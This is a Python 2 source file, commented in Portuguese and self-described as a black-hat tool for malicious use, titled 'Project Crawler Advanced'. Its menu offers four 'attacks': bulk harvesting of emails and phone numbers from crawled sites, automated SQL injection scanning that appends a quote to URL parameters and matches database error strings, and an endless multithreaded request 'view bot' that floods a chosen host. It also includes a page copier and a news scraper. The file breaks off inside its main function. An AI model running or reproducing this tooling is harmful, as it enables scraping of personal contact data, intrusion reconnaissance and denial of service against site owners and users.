# coding=utf-8
"""
Python: 2
Programa: Project Crawler Advanced
Sistema: LINUX
Funcoes: Salvar emails, telefones, investigacao completa de 1 ou milhoes de paginas em sequencia
Alerta: Hackers, Crackers, Script kiddies usem com cuidado

#########################################
#          Dark Programmer 000          #
#########################################

Black Hat: Cria métodos, ferramentas, e scripts desenvolvidos para uso malicioso.
"""

# Bibliotecas
import os
import re
import sys
import bs4
import time
import requests
import itertools
import threading

##################################
#          ATAQUE 1              #
##################################

# Crawler_HTML: Copia de HTML [Code Review OK]
def Crawler_HTML():

    try:
        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m +++++++++++++++++++++++++  \033[01;37m")
        print("\033[01;36m      Crawler               \033[01;37m")
        print("\033[01;32m      Copy HTML             \033[01;37m")
        print("\033[01;34m ++++++++++++++++++++++++++ \033[01;37m")
        print("\n\033[01;35m !!! Lista (site.txt) !!! \033[01;37m")
        print("\033[01;31m # Obs: Coloque o site dentro do arquivo \n\033[01;37m")

        # Estrutura de decisao: Criando diretorio caso nao exista
        if not os.path.exists("html"):

            # Criando diretorio
            os.mkdir("html")

        # Abertura de arquivo
        file = open("sites.txt", "r")

        # Leitura sem pulo de linha
        sites = file.read().rsplit("\n")

        # Cabecalho
        header = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"}

        # Estrutura de repeticao: Analisando os sites
        for i in range(0, len(sites)):

            try:
                # Estrutura de decisao
                if (i+1) == len(sites):

                    print("\033[01;32m * Copia de url(s) concluida(s) \033[01;37m\n")

                    # Fechando arquivo
                    os.system("mv url[*.html html/")
                    html_file.close()
                    break

                else:
                    # Arquivo criado
                    html_file = open("url[" + str(i + 1) + "].html", "w")

                    # Requisicao HTML
                    html = requests.get(url=sites[i], headers=header).text

                    # Gerando relatorio em html
                    html_file.write(html)

                    print("\033[01;34m * Copia de url[" + str((i + 1)) + "] concluida(s) \033[01;37m\n")

            except:
                continue
    except:
        pass

##################################
#          ATAQUE 2              #
##################################

# Crawler_Forensics_menu: Menu [Code Review OK]
def Crawler_Forensics_menu():

    try:
        # Lista
        lista_menu = ["1", "2"]

        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
        print("\033[01;36m      Crawler              \033[01;37m")
        print("\033[01;32m      Forensics            \033[01;37m")
        print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
        print("\033[01;32m\n [1] Pagina             \033[01;37m")
        print("\033[01;33m [2] Infinitas paginas  \033[01;37m")
        print("")

        # Entrada de dados
        opc = raw_input("\033[01;34m * Opc: \033[01;37m")

        # Estrutura em laco
        while opc not in lista_menu:

            try:
                # Apresentacao
                os.system("clear")
                print("")
                print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
                print("\033[01;36m      Crawler              \033[01;37m")
                print("\033[01;32m      Forensics            \033[01;37m")
                print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
                print("\n\033[01;35m !!! Lista (site.txt) !!! \033[01;37m")
                print("\033[01;31m # Obs: Coloque o site dentro do arquivo \n\033[01;37m")
                print("\033[01;32m [1] Pagina             \033[01;37m")
                print("\033[01;33m [2] Infinitas paginas  \033[01;37m")

                # Entrada de dados
                opc = raw_input("\n\033[01;34m * Opc: \033[01;37m")

            except:
                continue

        ### Estrutura de decisao ###

        # Opcao 1
        if opc == "1":

            # Chamada de metodo
            Crawler_Forensics_page()

        # Opcao 2
        elif opc == "2":

            # Chamada de metodo
            Crawler_Forensics_infinity()

    except:
        pass

# Crawler_Forensics_page: Crawler forense (email, links e telefone) [Code Review OK]
def Crawler_Forensics_page():

    try:
        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m ++++++++++++++++++++++++ \033[01;34m")
        print("\033[01;36m        Forensics         \033[01;34m")
        print("\033[01;32m        Page              \033[01;34m")
        print("\033[01;34m ++++++++++++++++++++++++ \033[01;34m")
        print("\n\033[01;35m !!! Lista (site.txt) !!! \033[01;34m")
        print("\033[01;31m # Obs: Coloque o site dentro do arquivo \n\033[01;37m")

        # Estrutura de decisao: Criando diretorio caso nao exista
        if not os.path.exists("Forensics_page"):

            # Criando diretorio
            os.mkdir("Forensics_page")

        # Lista de Emails
        lista_email = open("email.txt", "w")

        # Lista de Telefone
        lista_telefone = open("telefone.txt", "w")

        # Movendo arquivo para diretorio
        os.system("mv email.txt telefone.txt Forensics_page/")

        # Abertura de arquivo
        file = open("sites.txt", "r")

        # Leitura de arquivo
        sites = file.read().rsplit("\n")

        # Cabecalho
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"}

        # Estrutura de repeticao: Links dos sites
        for i in range(0, len(sites)):

            try:
                # Apresentacao
                time.sleep(2)
                os.system("clear")
                print(" ----------------------------------------------- ")
                print("\033[01;32m + Crawling Site: \033[01;37m" + str(sites[i]))
                print(" ------------------------------------------------ ")
                print("")

                # Requisicao HTML
                html = requests.get(url=sites[i], headers=header).text

                # Regex
                '''
                \w --> Letras maiusculas e minusculas
                 _ --> Caractere
                '''

                #############################################################################################
                # Forense: Links na pagina HTML
                link = re.findall("http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+", html)

                ## Estrutura de repeticao: LINK
                print("\n  ***************************************** ")
                for a in range(0, len(link)):

                    # Links
                    print("\033[01;34m  - Link: \033[01;37m" + str(link[a]))

                print("  ***************************************** ")

                #############################################################################################
                # Forense: Emails na pagina HTML
                email = re.findall("[a-zA-Z0-9+_\-.]+@[0-9a-zA-Z][.-0-9a-zA-Z]*.[a-zA-Z]+", html)
                lista_email.write("\n - Site: " + str(sites[i] + "\n"))

                ## Estrutura de repeticao: EMAIL
                print("\n  ***************************************** ")
                for b in range(0, len(email)):

                    # Emails
                    print("\033[01;33m  - Email: " + str(email[b]) + "\033[01;37m")

                    # Estrutura de decisao: Email dentro da lista
                    if email[b] in email:

                        # Escrevendo em relatorio
                        lista_email.write(" # " + str(email[b]) + "\n")

                print("  ***************************************** ")

                #############################################################################################
                # Forense: Telefones na pagina HTML
                telefone = re.findall("(\(?\d{2}\)?\s)?(\d{4,5}-\d{4})", html)
                lista_telefone.write("\n - Site: " + str(sites[i]) + "\n")

                ## Estrutura de repeticao: TELEFONE
                print("\n  ***************************************** ")
                for c in range(0, len(telefone)):

                    # Telefone
                    print("\033[01;36m  - Telefone: " + str(telefone[c][0]) + str(telefone[c][1]) + "\033[01;37m")

                    # Estrutura de decisao: Telefone dentro da lista
                    if telefone[c] in telefone:

                        # Escrevendo em relatorio
                        lista_telefone.write(" # " + str(telefone[c][0]) + str(telefone[c][1]) + "\n")

                print("  ***************************************** ")

                # Fechando arquivo
                print("\n  ***************************************** ")
                print("\033[01;31m  * Pericia concluida(s) \033[01;37m")
                print("  ***************************************** ")

                # Controle
                qtd_sites = len(sites)
                qtd_sites -= 1

                # Estrutura de decisao
                if qtd_sites == 0:
                    break

            except:
                continue

    except Exception as e:
        print(e)

# Crawler forense (email, links e telefone) de infinitas paginas [Code Review OK]
def Crawler_Forensics_infinity():

    # Listas de controle
    lista = []
    lista_inteligente = set()

    try:
        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m ++++++++++++++++++++++++ \033[01;34m")
        print("\033[01;36m        Forensics         \033[01;34m")
        print("\033[01;32m        Infinity Page     \033[01;34m")
        print("\033[01;34m ++++++++++++++++++++++++ \033[01;34m")
        print("")

        # Entrada de dados
        url = raw_input("\033[01;31m * URL: \033[01;37m")
        qtd_page = int(raw_input("\033[01;31m\n * Numero de paginas (Ex: 10): \033[01;37m"))
        lista.append(url)

        # Criando diretorio caso nao exista
        if not os.path.exists("Forensics_Infinity_page"):

            # Criando diretorio
            os.mkdir("Forensics_Infinity_page")

        # Lista de Emails
        lista_email = open("email.txt", "w")

        # Lista de Telefone
        lista_telefone = open("telefone.txt", "w")

        # Movendo arquivo para diretorio
        os.system("mv email.txt telefone.txt Forensics_Infinity_page/")

        # Cabecalho
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"}

        # Estrutura de repeticao: Limite de paginas a procurar
        cont = 0
        while cont <= qtd_page:

            # Controle de fluxo
            if cont == qtd_page:
                sys.exit(0)

            # Controle
            cont += 1

            try:

                # Apresentacao
                os.system("clear")
                print(" ----------------------------------------------- ")
                print("\033[01;32m + Crawling Site: \033[01;37m" + str(lista[0]))
                print(" ------------------------------------------------ ")
                print("")

                # Requisicao HTML
                html = requests.get(url=lista[0], headers=header).text

                # Regex
                '''
                \w --> Letras maiusculas e minusculas
                 _ --> Caractere
                '''

                #############################################################################################
                # Forense: Links na pagina HTML
                link = re.findall("http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+", html)

                ## Estrutura de repeticao: LINK
                print("\n  ***************************************** ")
                for a in range(0, len(link)):

                    # Links
                    print("\033[01;34m  - Link: \033[01;37m" + str(link[a]))

                    # Estrutura de decisao
                    if (link[a] not in lista) and (link[a] not in lista_inteligente):

                        # Escrevendo relatorio
                        lista.append(link[a])

                print("  ***************************************** ")

                #############################################################################################
                # Forense: Emails na pagina HTML
                email = re.findall("[a-zA-Z0-9+_\-.]+@[0-9a-zA-Z][.-0-9a-zA-Z]*.[a-zA-Z]+", html)
                lista_email.write("\n - Site: " + str(lista[0] + "\n"))

                ## Estrutura de repeticao: EMAIL
                print("\n  ***************************************** ")
                for b in range(0, len(email)):

                    # Emails
                    print("\033[01;33m  - Email: " + str(email[b]) + "\033[01;37m")

                    # Estrutura de decisao
                    if email[b] in email:

                        # Escrevendo relatorio
                        lista_email.write(" # " + str(email[b]) + "\n")

                print("  ***************************************** ")

                #############################################################################################
                # Forense: Telefones na pagina HTML
                telefone = re.findall("(\(?\d{2}\)?\s)?(\d{4,5}-\d{4})", html)
                lista_telefone.write("\n - Site: " + str(lista[0]) + "\n")

                ## Estrutura de repeticao: TELEFONE
                print("\n  ***************************************** ")
                for c in range(0, len(telefone)):

                    # Telefones
                    print("\033[01;36m  - Telefone: " + str(telefone[c][0]) + str(telefone[c][1]) + "\033[01;37m")

                    # Estrutura de decisao
                    if telefone[c] in telefone:

                        # Escrevendo relatorio
                        lista_telefone.write(" # " + str(telefone[c][0]) + str(telefone[c][1]) + "\n")

                print("  ***************************************** ")

                # Fechando arquivo
                print("\n  ***************************************** ")
                print("\033[01;31m  * Pericia concluida \033[01;37m")
                print("  ***************************************** ")

                # Adicioanar a lista inteligente e retirar da lista normal
                lista_inteligente.add(lista[0])
                lista.remove(lista[0])

                # Estrutura de repeticao
                print("\n")

                # Estrutura de repeticao: Contagem regressiva
                for d in range(1, 4):

                    print("\033[01;31m ! Reiniciando ... \033[01;37m" + str(d))
                    time.sleep(1)

                print("\n")

            except:
                continue

    except Exception as e:
        print(e)

##################################
#          ATAQUE 3              #
##################################

# Crawler_SQL_menu: Menu [Code Review OK]
def Crawler_SQL_menu():

    try:
        # Lista
        lista_menu = ["1", "2", "3"]

        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m ++++++++++++++++++++++++++ \033[01;37m")
        print("\033[01;36m      Crawler               \033[01;37m")
        print("\033[01;32m      SQL Injection Test    \033[01;37m")
        print("\033[01;34m ++++++++++++++++++++++++++ \033[01;37m")
        print("\033[01;32m [1] Site              \033[01;37m")
        print("\033[01;33m [2] Links do site     \033[01;37m")
        print("\033[01;34m [3] Infinitas paginas \033[01;37m")
        print("")

        # Entrada de dados
        opc = raw_input("\033[01;31m * Opc: \033[01;37m")

        # Estrutura em laco
        while opc not in lista_menu:

            try:
                # Apresentacao
                os.system("clear")
                print("")
                print("\033[01;34m ++++++++++++++++++++++++++ \033[01;37m")
                print("\033[01;36m      Crawler               \033[01;37m")
                print("\033[01;32m      SQL Injection Test    \033[01;37m")
                print("\033[01;34m ++++++++++++++++++++++++++ \033[01;37m")
                print("\033[01;32m [1] Site              \033[01;37m")
                print("\033[01;33m [2] Links do site     \033[01;37m")
                print("\033[01;34m [3] Infinitas paginas \033[01;37m")

                # Entrada de dados
                opc = raw_input("\n\033[01;31m Opc: \033[01;37m")

            except:
                continue

        ## Estrutura de decisao ##

        # Opcao 1
        if opc == "1":

            # Chamada de metodo
            Crawler_SQL_site()

        # Opcao 2
        if opc == "2":

            # Chamada de metodo
            Crawler_SQL_page()

        # Opcao 3
        elif opc == "3":

            # Chamada de metodo
            Crawler_SQL_infinity()

    except:
        pass

# Crawler_SQL_site: Teste da URL [Code Review OK]
def Crawler_SQL_site():

    try:
        # Apresentacao
        os.system("clear")
        print("\033[01;34m +++++++++++++++++++++++++++++++++ \033[01;37m")
        print("\033[01;36m      Crawler                      \033[01;37m")
        print("\033[01;32m      SQL Injection Site Test      \033[01;37m")
        print("\033[01;34m +++++++++++++++++++++++++++++++++ \033[01;37m")
        print("\n\033[01;35m !!! Lista (site.txt) !!! \033[01;37m")
        print("\033[01;31m # Obs: Coloque o site dentro do arquivo \n\033[01;37m")

        # Contagem de sites vulneraveis
        cont = 0

        # Abertura de arquivos
        sql_teste = open("sites.txt", "r")

        # Relatorio dos sites vulneraveis
        sql_vuln = open("sites_vulneraveis.txt", "w")

        # Estrutura de decisao: Criando diretorio caso nao exista
        if not os.path.exists("Crawler_Sql_Site"):

            # Criando diretorio
            os.mkdir("Crawler_Sql_Site")

        # Movendo arquivo para diretorio
        os.system("mv sites_vulneraveis.txt Crawler_Sql_Site/")

        # Leitura dos sites a serem analisados
        lista_url = sql_teste.read().split("\n")

        # Cabecalho (header)
        cabecalho = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"}

        print(" ****************************************************************** ")
        # Estrutura de repeticao: Links
        for i in range(0, len(lista_url)):

            try:
                # Tupla 1 da url: (http://www.site.com.br/login.php?id=) -- Tupla 2(1)
                url_tupla_1 = re.findall("([\w:/._\-?]+=)([\w_\-]+)", lista_url[i])
                url_inject = str(url_tupla_1[0][0]) + "'"

                # Requisicao GET
                html = requests.get(url=url_inject, headers=cabecalho).text

                # Saida de erros de SQL
                e1 = "mysql_fetch_array()" in html
                e2 = "Database error" in html
                e3 = "MySQL Error" in html
                e4 = "You have an error in your SQL syntax" in html
                e5 = "check the manual that corresponds to your MySQL server" in html
                e6 = "mysql_num_rows()" in html
                e7 = "mysql_num_rows() expects parameter 1" in html
                e8 = "mysql_num_rows() expects parameter 1 to be resource" in html
                e9 = "supplied argument is not a valid MySQL" in html
                e10 = "Microsoft OLE DB Provider for SQL Server error '80040e14'" in html

                # Estrutura de decisao: Qualificacao de erros
                if e1 or e2 or e3 or e4 or e5 or e6 or e7 or e8 or e9 or e10:

                    # Mensagem (colorindo o arquivo)
                    print("\033[01;31m * Vulneravel: " + str(lista_url[i]).rstrip("\n") + "\033[01;37m")

                    # Mensagem (sem colorindo o arquivo)
                    #print("\033[01;31m * Vulneravel: \033[01;37m" + str(lista_url[i]))

                    # Escrevendo no arquivo
                    sql_vuln.write("\n* " + lista_url[i])

                    # Contador de sites vulneraveis
                    cont += 1

                else:

                    # Mensagem (colorindo o arquivo)
                    print("\033[01;32m + Protegido : " + str(lista_url[i]).rstrip("\n") + "\033[01;37m")

                    # Mensagem (nao colorindo o arquivo)
                    # print("\033[01;32m + Protegido : \033[01;37m" + str(lista_url[i]))

                # Controle
                qtd_sites = len(lista_url)
                qtd_sites -= 1

                if qtd_sites == 0:
                    break

            except:
                continue

        # Salvando em relatorio
        sql_vuln.write("\n\n# Sites vulneraveis: " + str(cont))

        # Fechamento de arquivo
        sql_teste.close()
        sql_vuln.close()

        print(" ****************************************************************** ")

    except:
        pass

# Crawler_SQL_page: Teste de sql por link de pagina [Code Review OK]
def Crawler_SQL_page():

    try:
        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m ++++++++++++++++++++++++++++++++ \033[01;34m")
        print("\033[01;36m      Crawler                     \033[01;34m")
        print("\033[01;32m      SQL Injection Test Page     \033[01;34m")
        print("\033[01;34m ++++++++++++++++++++++++++++++++ \033[01;34m")
        print("\n\033[01;35m !!! Lista (site.txt) !!! \033[01;34m")
        print("\033[01;31m # Obs: Coloque o site dentro do arquivo \n\033[01;37m")

        # Abertura de arquivos
        sql_teste = open("sites.txt", "r")

        # Relatorio dos sites vulneraveis
        sql_vuln = open("sites_vulneraveis.txt", "w")

        # Criando diretorio caso nao exista
        if not os.path.exists("Crawler_Sql_Page"):

            # Criando diretorio
            os.mkdir("Crawler_Sql_Page")

        # Movendo arquivo para diretorio
        os.system("mv sites_vulneraveis.txt Crawler_Sql_Page/")

        # Leitura de arquivo sem pulo de linha
        sites = sql_teste.read().rsplit("\n")

        # Cabecalho
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"}

        # Estrutura de repeticao: Sites na lista
        cont = 0
        for i in range(0, len(sites)):

            try:
                # Apresentacao
                os.system("clear")
                print(" ----------------------------------------------- ")
                print("\033[01;32m + Crawling Site: \033[01;37m" + str(sites[i]))
                print(" ------------------------------------------------ ")
                print("")

                # Requisicao HTML
                html = requests.get(url=sites[i], headers=header).text

                # Regex
                '''
                \w --> Letras maiusculas e minusculas
                 _ --> Caractere
                '''

                #############################################################################################
                # Forense: Links na pagina HTML
                link = re.findall("http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+", html)

                ## Estrutura de repeticao: LINK
                print("\n  ***************************************** ")
                for a in range(0, len(link)):

                    if sql_scan_support(link[a]):

                        # Mensagem
                        print("\033[01;32m - Vulneravel : " + str(link[a]) + "\033[01;37m")
                        cont += 1

                        # Salvando em relatorio
                        sql_vuln.write(link[a] + "\n")

                    else:

                        # Mensagem
                        print("\033[01;31m - Protegido : " + str(link[a]) + "\033[01;37m")

                print("  ***************************************** ")

                # Fechando arquivo
                print("\n  ***************************************** ")
                print("\033[01;31m  * Pericia concluida \033[01;37m")
                print("  ***************************************** ")
                time.sleep(2)

                # Controle
                qtd_sites = len(sites)
                qtd_sites -= 1

                if qtd_sites == 0:
                    break

            except:
                continue

        # Salvando em relatorio
        print("\n\033[01;31m  # Links vulneraveis: " + str(cont) + "\n\033[01;37m")

        # Fechamento de arquivo
        sql_teste.close()

    except Exception as e:
        print(e)

# Crawler SQL (Teste de sql por links infinitos)
def Crawler_SQL_infinity():

    # Listas de controle
    lista = []
    lista_inteligente = set()

    try:
        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m +++++++++++++++++++++++++++++++++++++ \033[01;37m")
        print("\033[01;36m      Crawler                          \033[01;37m")
        print("\033[01;32m      SQL Injection Test Infinity      \033[01;37m")
        print("\033[01;34m +++++++++++++++++++++++++++++++++++++ \033[01;37m")
        print("")

        # Entrada de dados
        url = raw_input("\033[01;31m\n * URL: \033[01;37m")
        qtd_page = int(raw_input("\033[01;31m\n * Numero de paginas (Ex: 10): \033[01;37m"))
        lista.append(url)

        # Relatorio dos sites vulneraveis
        sql_vuln = open("sites_vulneraveis.txt", "w")

        # Criando diretorio caso nao exista
        if not os.path.exists("Crawler_Sql_Infinity"):

            # Criando diretorio
            os.mkdir("Crawler_Sql_Infinity")

        # Movendo arquivo para diretorio
        os.system("mv sites_vulneraveis.txt Crawler_Sql_Infinity/")

        # Cabecalho
        header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"}

        # Estrutura de repeticao: Limite de paginas a procurar
        cont = 0
        cont_vuln = 0
        while cont < qtd_page:

            # Controle de fluxo
            if cont == qtd_page:
                break

            # Contador
            cont += 1

            try:
                os.system("clear")
                print(" ----------------------------------------------- ")
                print("\033[01;32m + Crawling Site: \033[01;37m" + str(lista[0]))
                print(" ------------------------------------------------ ")
                print("")

                # Requisicao HTML
                html = requests.get(url=lista[0], headers=header).text

                # Regex
                '''
                \w --> Letras maiusculas e minusculas
                 _ --> Caractere
                '''

                #############################################################################################
                # Forense: Links na pagina HTML
                link = re.findall("http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+", html)

                ## Estrutura de repeticao: LINK
                print("\n  ***************************************** ")
                for a in range(0, len(link)):

                    # Estrutura de decisao
                    if (link[a] not in lista) and (link[a] not in lista_inteligente):
                        lista.append(link[a])

                        # Estrutura de decisao
                        if sql_scan_support(link[a]):

                            # Mensagem
                            print("\033[01;32m - Vulneravel : " + str(link[a]) + "\033[01;37m")
                            cont_vuln += 1

                            # Salvando em relatorio
                            sql_vuln.write(link[a] + "\n")

                        else:

                            print("\033[01;31m - Protegido : " + str(link[a]) + "\033[01;37m")

                print("  ***************************************** ")

                # Fechando arquivo
                print("\n  ***************************************** ")
                print("\033[01;31m  * Pericia concluida \033[01;37m")
                print("  ***************************************** ")

                # Adicioanar a lista inteligente e retirar da lista normal
                lista_inteligente.add(lista[0])
                lista.remove(lista[0])

                # Estrutura de repeticao
                print("\n")

                # Estrutura de repeticao: Contagem regressiva
                for d in range(1, 4):

                    # Mensagem
                    print("\033[01;31m ! Reiniciando ... \033[01;37m" + str(d))
                    time.sleep(1)

                print("")

            except:
                continue

        # Salvando em relatorio
        print("\033[01;31m # Links vulneraveis: " + str(cont_vuln) + "\n\033[01;37m")

        # Fechamento de arquivo
        sql_vuln.close()

    except Exception as e:
        print(e)

# Suporte
def sql_scan_support(link):

    try:

        cabecalho = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}

        # Identificando tupla 1
        url_tupla_1 = re.search("([\w:/._\-?]+=)([\w_.\-]+)", link)  # (http://testphp.vulnweb.com/artists.php?artist=) (1)

        # Retirar tupla 2 e injetar com a tupla 1: Tupla 1 + '
        url_injetada = url_tupla_1.groups()[0] + "'"

        # Requisicao da URL com possivel falha
        html = requests.get(url=url_injetada, headers=cabecalho).text

        # Saida de erros
        e1 = "mysql_fetch_array()" in html
        e2 = "Database error" in html
        e3 = "MySQL Error" in html
        e4 = "You have an error in your SQL syntax" in html
        e5 = "check the manual that corresponds to your MySQL server" in html
        e6 = "mysql_num_rows()" in html
        e7 = "mysql_num_rows() expects parameter 1" in html
        e8 = "mysql_num_rows() expects parameter 1 to be resource" in html
        e9 = "supplied argument is not a valid MySQL" in html
        e10 = "Microsoft OLE DB Provider for SQL Server error '80040e14'" in html

        # Estrutura de decisao: Qualificacao de erros
        if e1 or e2 or e3 or e4 or e5 or e6 or e7 or e8 or e9 or e10:

            # Retorno verdadeiro
            return True

        else:

            # Retorno falso
            return False

    except:
        pass

##################################
#          ATAQUE 4              #
##################################

# Crawler_BOT_menu (OK)
def Crawler_BOT_menu():

    try:
        # Lista
        lista_menu = ["1", "2"]

        # Apresentacao
        os.system("clear")
        print("")
        print("\033[01;34m +++++++++++++++++++ \033[01;37m")
        print("\033[01;36m      Crawler        \033[01;37m")
        print("\033[01;32m        BOT          \033[01;37m")
        print("\033[01;34m +++++++++++++++++++ \033[01;37m")
        print("\n\033[01;33m [1] Visualizacoes \033[01;37m")
        print("\033[01;36m [2] Noticias Brasil \033[01;37m")

        # Entrada de dados
        opc = raw_input("\n\033[01;31m Opc: \033[01;37m")

        # Estrutura em laco
        while opc not in lista_menu:

            try:
                # Apresentacao
                os.system("clear")
                print("")
                print("\033[01;34m +++++++++++++++++++ \033[01;37m")
                print("\033[01;36m      Crawler        \033[01;37m")
                print("\033[01;32m        BOT          \033[01;37m")
                print("\033[01;34m +++++++++++++++++++ \033[01;37m")
                print("\033[01;33m [1] Visualizacoes Facebook \033[01;37m")
                print("\033[01;36m [2] Noticias Google        \033[01;37m")

                # Entrada de dados
                opc = raw_input("\n\033[01;31m Opc: \033[01;37m")

            except:
                continue

        # Estrutura de decisao

        # Opcao 1
        if opc == "1":

            # Chamada de metodo
            Crawler_BOT_visualizacoes()

        # Opcao 2
        if opc == "2":

            # Chamada de metodo
            Crawler_BOT_noticias()

    except:
        pass

# Crawler_BOT_visualizacoes
def Crawler_BOT_visualizacoes():

    os.system("clear")
    print("")
    print("\033[01;34m +++++++++++++++++++ \033[01;37m")
    print("\033[01;36m      Crawler        \033[01;37m")
    print("\033[01;32m        BOT          \033[01;37m")
    print("\033[01;34m +++++++++++++++++++ \033[01;37m")
    print("")

    # Entrada de dados:
    url = str(raw_input("\033[01;36m - Host (http://www.bancocn.com): \033[01;37m"))

    def visualizacao(controle):

        while True:

            try:
                # Configuracao
                header = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"}

                # Requisicao
                requisicao = requests.get(url=url, headers=header)

                # Saida de dados
                print("\n - Site: " + str(requisicao.url))
                print(" - Requisicao: " + str(requisicao.request))
                print(" - Codigo de saida: " + str(requisicao.status_code))

                for i, j in requisicao.headers.items():
                    print(" - " + str(i) + ": " + str(j))

            except:
                continue

    # Bot de visualizacao infinita (!!! Cuidado o sistema pode travar !!!)
    while True:

        for i in range(True):

            threading.Thread(target=visualizacao, args=[str(i)]).start()

# Crawler_BOT_noticias
def Crawler_BOT_noticias():

    # Sub-Metodo
    def Noticias():

        try:
            # Sistema
            os.system("clear")

            # Configuracoes
            url = "https://g1.globo.com"
            cabecalho = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}

            # Html aperfeicoado
            html = requests.get(url=url, headers=cabecalho).text
            html_super = bs4.BeautifulSoup(html, "html.parser")

            # Crawler
            noticias = html_super.find_all(class_="feed-post-link gui-color-primary gui-color-hover")

            print("\n\033[01;32m *** Principais noticias G1 *** \033[01;37m\n")
            for i in range(0, len(noticias)):

                print("\033[01;34m * Noticas: \033[01;37m" + str(noticias[i].get_text()))

            time.sleep(120)
            Google_Brasil()

        except Exception as e:
            print e
            pass

    def Google_Brasil():

        lista = []

        try:
            os.system("clear")

            url = "https://news.google.com/?hl=pt-BR&gl=BR&ceid=BR:pt-419"
            url_ajuste = "https://news.google.com"
            cabecalho = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"}

            # Html aperfeicoado
            html = requests.get(url=url, headers=cabecalho).text
            html_super = bs4.BeautifulSoup(html, "html.parser")

            # Procurando
            noticias = html_super.find_all(class_="DY5T1d")

            print("\n\033[01;34m *** Principais noticias Google Brasil *** \033[01;37m")

            for i in range(0, len(noticias)):
                print("\033[01;32m * Noticas: \033[01;37m" + str(noticias[i].get_text()))
                # print("\033[01;36m # Links: \033[01;37m" + str(str(url_ajuste) + str(noticias[i].get("href"))))
                # print("\033[01;36m # Links: \033[01;37m" + str(noticias[i].get("href")))
            time.sleep(300)

        except Exception as e:
            print(e)
            pass

    while True:
        # Chamada de metodo
        Noticias()

######################################
#          CONTROLE DE MENU          #
######################################

# Metodo: Menu principal
def Menu():

    # Lista
    lista_menu = ["1", "2", "3", "4", "5"]

    # Apresentacao
    os.system("clear")
    print("")
    print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
    print("\033[01;36m      Final Crawler        \033[01;37m")
    print("\033[01;32m      DarkProgrammer000    \033[01;37m")
    print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
    print("")
    print("\033[01;32m [1] HTML          \033[01;37m")
    print("\033[01;33m [2] FORENSICS     \033[01;37m")
    print("\033[01;34m [3] SQL INJECTION \033[01;37m")
    print("\033[01;36m [4] BOT           \033[01;37m")
    print("\033[01;37m [5] SAIR          \033[01;37m")

    # Entrada de dados
    opc = raw_input("\n\033[01;31m + Opc: \033[01;37m")

    # Estrutura em laco: Protecao de menu
    while opc not in lista_menu:

        try:
            # Apresentacao
            os.system("clear")
            print("")
            print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
            print("\033[01;36m      Final Crawler        \033[01;37m")
            print("\033[01;32m      DarkProgrammer000    \033[01;37m")
            print("\033[01;34m +++++++++++++++++++++++++ \033[01;37m")
            print("")
            print("\033[01;32m [1] HTML          \033[01;37m")
            print("\033[01;33m [2] FORENSICS     \033[01;37m")
            print("\033[01;34m [3] SQL INJECTION \033[01;37m")
            print("\033[01;36m [4] BOT           \033[01;37m")
            print("\033[01;37m [5] SAIR          \033[01;37m")

            # Entrada de dados
            opc = raw_input("\n\033[01;31m + Opc: \033[01;37m")

        except:
            continue

    # Retorno de opcao
    return opc

# Metodos: Tipos de ataques
def Crawler_types(opc):

    ### Estrutura de decisao ###

    # Opcao: 1
    if opc == "1":

        # Chamada de metodo
        Crawler_HTML()

    # Opcao: 2
    elif opc == "2":

        # Chamada de metodo
        Crawler_Forensics_menu()

    # Opcao: 3
    elif opc == "3":

        # Chamada de metodo
        Crawler_SQL_menu()

    # Opcao: 4
    elif opc == "4":

        # Chamada de metodo
        Crawler_BOT_menu()

    # Opcao: 5
    elif opc == "5":

        # Chamada de metodo
        sys.exit(0)

##########################################
#          CONTROLE DO PROGRAMA          #
##########################################

# Metodo do sistema
def Sistema():

    # Configuracoes do Sistema
    os.environ['TERM'] = 'xterm'
    reload(sys)

    # Padrao: UTF-8
    sys.setdefaultencoding('utf-8')

# Metodo Principal
def Main():

    # here is the animation
    def animate():

        for c in itertools.cycle(['|', '/', '-', '\\']):

            if done:
                break

            # Loading
            sys.stdout.write("\r\033[01;32m # Loading \033[01;37m" + "\033[01;31m" + c + "\033[01;37m")
            sys.stdout.flush()
            time.sleep(0.01)

    # Apresentacao de curto duracao
    os.system("clear")
